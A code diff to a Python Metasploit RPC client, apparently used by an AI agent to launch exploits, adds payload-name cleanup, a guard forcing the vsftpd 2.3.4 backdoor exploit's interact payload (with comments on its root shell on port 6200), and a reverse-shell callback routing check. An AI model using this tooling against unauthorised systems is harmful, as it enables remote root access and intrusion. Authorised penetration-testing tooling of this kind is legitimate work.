@@ -1,5 +1,6 @@
 import subprocess
 import asyncio
+import ipaddress
 import os
 import json
 import time as _time
@@ -352,7 +353,8 @@ class MetasploitClient:
         "(one of 'exploit', 'auxiliary', 'post') and pass it VERBATIM alongside "
         "the module_path. Examples:\n"
         "  - exploit (vsftpd_234_backdoor): category='exploit', "
-        "    options={RHOSTS: '...', PAYLOAD: 'cmd/unix/bind_perl', LPORT: '...'}\n"
+        "    options={RHOSTS: '...', PAYLOAD: 'cmd/unix/interact'}\n"
+        "    (interact-class backdoor: no LHOST/LPORT, start_handler=False)\n"
         "  - auxiliary (ssh_login): category='auxiliary', "
         "    options={RHOSTS: '...', USERNAME: '...', PASSWORD: '...'}\n"
         "  - post (gather enum_info): category='post', "
@@ -518,6 +520,111 @@ class MetasploitClient:
             # RPC call — this is the ONLY way those values reach MSF.
             opts = dict(options)  # copy so we don't mutate the caller's dict
             payload_name = opts.pop("PAYLOAD", None)
+
+
+            # PAYLOAD format hygiene: the secretary model occasionally
+            # hallucinates an MSF-internal 'payload/' prefix (e.g.
+            # 'payload/cmd/unix/reverse_awk') because module listings
+            # sometimes render payloads that way. MSF itself wants the bare
+            # fullname; 'payload/x' is never a valid payload name, so
+            # stripping exactly one leading 'payload/' is a lossless fix.
+            if isinstance(payload_name, str):
+                cleaned = payload_name.strip()
+                if cleaned.lower().startswith("payload/"):
+                    fixed = cleaned[len("payload/"):]
+                    print(
+                        f"[i] Stripped hallucinated 'payload/' prefix from "
+                        f"PAYLOAD: {payload_name!r} -> {fixed!r} (MSF payload "
+                        f"names never carry the 'payload/' prefix)."
+                    )
+                    payload_name = fixed
+
+            # Interact-class exploit guard. Some exploits deliver NO payload
+            # at all: the trigger makes the TARGET spawn an inline service
+            # (e.g. vsftpd_234_backdoor binds a root shell on target port
+            # 6200 after the ':)' username) and the module itself connects
+            # to that port to interact (payload class cmd_interact,
+            # connection type 'find'). Passing any custom reverse/bind
+            # payload is incompatible, and omitting PAYLOAD entirely makes
+            # execute() set DisablePayloadHandler=True — which kills the
+            # module's own connect-to-6200 step. The ONLY working invocation
+            # is PAYLOAD='cmd/unix/interact' with start_handler=False.
+            INTERACT_FORCE_MODULES = {
+                "exploit/unix/ftp/vsftpd_234_backdoor",
+            }
+            if mtype == "exploit" and module_path in INTERACT_FORCE_MODULES:
+                if payload_name != "cmd/unix/interact":
+                    old = payload_name if payload_name else "(none)"
+                    payload_name = "cmd/unix/interact"
+                    print(
+                        f"[i] Interact-class module guard: '{module_path}' "
+                        f"delivers NO payload — it triggers a shell ON the "
+                        f"target (vsftpd_234_backdoor binds root on port 6200 "
+                        f"after the ':)' username) and connects inbound. "
+                        f"Forcing PAYLOAD {old!r} -> 'cmd/unix/interact' "
+                        f"(no LHOST/LPORT needed; start_handler must be False)."
+                    )
+                for dropped in ("LHOST", "LPORT", "ListenerBindAddress", "ListenerBindPort"):
+                    if dropped in opts:
+                        opts.pop(dropped)
+                        print(
+                            f"[i] Interact-class module guard: dropped "
+                            f"'{dropped}' from options (not used by "
+                            f"'{module_path}')."
+                        )
+
+            # Route-affinity guard for reverse/bind callbacks. NON-FATAL:
+            # warns when the callback address (LHOST/SRVHOST/
+            # ListenerBindAddress) is not an IP of the interface the route
+            # to RHOSTS egresses from. Topology-agnostic — follows the
+            # actual kernel route instead of assuming subnet layout, so it
+            # works for same-host VM nets, LANs, and VPN tunnels alike.
+            if mtype == "exploit":
+                _CB_KEYS = ("LHOST", "SRVHOST", "ListenerBindAddress")
+                cb_ip = next((opts[k] for k in _CB_KEYS if opts.get(k)), None)
+                rhost = opts.get("RHOSTS") or opts.get("RHOST")
+                if cb_ip and rhost and not str(cb_ip).startswith("127."):
+                    try:
+                        _probe = subprocess.run(
+                            ["ip", "route", "get", str(rhost).split("/")[0]],
+                            capture_output=True, text=True, timeout=5,
+                        )
+                        toks = _probe.stdout.split()
+                        iface = toks[toks.index("dev") + 1] if "dev" in toks else None
+                        if iface:
+                            _addr = subprocess.run(
+                                ["ip", "-4", "-o", "addr", "show", "dev", iface],
+                                capture_output=True, text=True, timeout=5,
+                            ).stdout
+                            iface_ips = [
+                                line.split()[3].split("/")[0]
+                                for line in _addr.splitlines()
+                                if len(line.split()) >= 4
+                            ]
+                            if iface_ips and str(cb_ip) not in iface_ips:
+                                cgnat = ""
+                                try:
+                                    if ipaddress.ip_address(str(cb_ip)) in ipaddress.ip_network("100.64.0.0/10"):
+                                        cgnat = (
+                                            " (inside 100.64.0.0/10 CGNAT range "
+                                            "- a tailnet address; unreachable "
+                                            "from targets that are not tailnet "
+                                            "nodes)"
+                                        )
+                                except ValueError:
+                                    pass
+                                print(
+                                    f"[!] Route-affinity WARNING: callback "
+                                    f"address {cb_ip}{cgnat} is NOT an IP of "
+                                    f"interface '{iface}' (own IPs: "
+                                    f"{iface_ips}), which is the egress toward "
+                                    f"{rhost}. The target likely cannot route a "
+                                    f"connection back to {cb_ip}. Prefer "
+                                    f"{iface_ips[0]} for LHOST, or use a bind "
+                                    f"payload with RHOST set to the target."
+                                )
+                    except Exception:
+                        pass  # the guard must never block a launch
 
             # The secretary model occasionally drops top-level arguments into
             # the `options` dict because the schema is permissive (additionalProperties
